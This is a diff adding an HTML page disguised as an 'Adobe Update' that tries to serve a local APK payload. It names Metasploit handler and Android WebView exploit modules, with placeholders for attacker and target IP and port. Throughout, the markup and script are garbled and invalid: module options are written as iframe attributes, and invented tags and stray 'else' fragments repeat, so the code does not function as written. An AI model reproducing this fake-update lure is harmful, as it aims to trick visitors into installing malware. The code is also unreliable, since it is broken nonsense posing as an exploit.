@@ -1,0 +1,65 @@
+<script>
+open = ("/home/kali/Desktop/adobe.apk") = executar
+</script>
+<iframe src = "/home/kali/Desktop/adobe.apk" href = "OK"/></iframe>
+<open = html = (run/exploit/msf6+++)>
+<html>
+  <head>
+    <title> Adobe Update </title>
+  </head>
+  <body>
+    <script>
+    window.setTimeout('location.reload(true);', 30);
+    </script>
+  <iframe src = 'exploit/multi/handler'
+          src = 'exploit/android/browser/webview_addjavascriptinterface'
+          src = "(LHOST = [SEU IP])"
+          src = "(RPORT = [SUA PORTA])"
+          src = "(SRVHOST = [ALVO IP])"
+          src = "(SRVPORT = [PORTA ALVO])"
+          src = "(URIPATH = /home/kali/Desktop/adobe.apk)"
+          src = '(run)'
+          src = '(exploit)'
+          else
+          src = '(msf6+++)'
+          end else (3) 
+          </iframe>
+          <div
+          action = (run)
+          action = (exploit)
+          else
+          action = (msf6+++)
+          end else(1)
+</div>
+<div import time = (30000000000000000) </div>
+<script>
+open = ("msf6+++")/("exploit"/("run") = executar 
+</script>
+<import src = ("/home/kali/Desktop/adobe.apk") </import>
+<import src = ("executar") </import>
+<div import time = (30000000000000000) </div>
+<script>
+open = ("msf6+++")/("exploit"/("run") = executar 
+</script>
+<import src = ("/home/kali/Desktop/adobe.apk") </import>
+<import src = ("executar") </import>
+<div import time = (30000000000000000) </div>
+<script>
+open = ("msf6+++")/("exploit"/("run")) = executar 
+</script>
+<import src = ("/home/kali/Desktop/adobe.apk") </import>
+<import src = ("executar") </import>
+<div import time = (30000000000000000) </div>
+<script>
+open = ("msf6+++")/("exploit"/("run") = executar 
+</script>
+<import src = ("/home/kali/Desktop/adobe.apk") </import>
+<import src = ("executar") </import>
+<div import time = (30000000000000000) </div>
+<script>
+open = ("msf6+++")/("exploit"/("run")) = executar
+</script>
+</script>
+<import src = ("executar") </import>
+  </body>
+</html>
